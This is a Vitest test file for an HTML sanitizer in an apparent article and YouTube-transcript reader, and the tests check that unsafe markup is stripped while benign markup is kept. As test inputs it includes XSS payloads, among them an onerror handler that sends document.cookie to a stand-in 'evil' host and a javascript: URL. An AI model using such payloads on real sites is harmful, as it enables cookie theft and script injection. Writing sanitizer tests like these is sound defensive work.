import { describe, it, expect } from 'vitest';
import { sanitizeReaderHtml } from './sanitize-html';

describe('sanitizeReaderHtml', () => {
	it('strips script tags', () => {
		const out = sanitizeReaderHtml('<p>hi</p><script>fetch("//evil")</script>');
		expect(out).toContain('<p>hi</p>');
		expect(out).not.toContain('<script');
	});

	it('strips event-handler attributes', () => {
		const out = sanitizeReaderHtml('<img src="x" onerror="fetch(\'//evil/\'+document.cookie)">');
		expect(out).not.toContain('onerror');
	});

	it('strips javascript: URLs', () => {
		const out = sanitizeReaderHtml('<a href="javascript:alert(1)">x</a>');
		expect(out).not.toContain('javascript:');
	});

	it('keeps benign article formatting', () => {
		const out = sanitizeReaderHtml('<p>Hello <strong>world</strong></p>');
		expect(out).toContain('<strong>world</strong>');
	});

	it('keeps the YouTube transcript embed iframe', () => {
		const out = sanitizeReaderHtml(
			'<div class="yt-embed"><iframe src="https://www.youtube.com/embed/abc123" allowfullscreen></iframe></div>'
		);
		expect(out).toContain('youtube.com/embed/abc123');
		expect(out).toContain('class="yt-embed"');
	});

	it('drops non-YouTube iframes', () => {
		const out = sanitizeReaderHtml('<iframe src="https://evil.example/frame"></iframe>');
		expect(out).not.toContain('<iframe');
		expect(out).not.toContain('evil.example');
	});

	it('keeps data attributes used by transcript timestamps', () => {
		const out = sanitizeReaderHtml('<span class="t-seg" data-t="0:05">text</span>');
		expect(out).toContain('data-t="0:05"');
	});
});
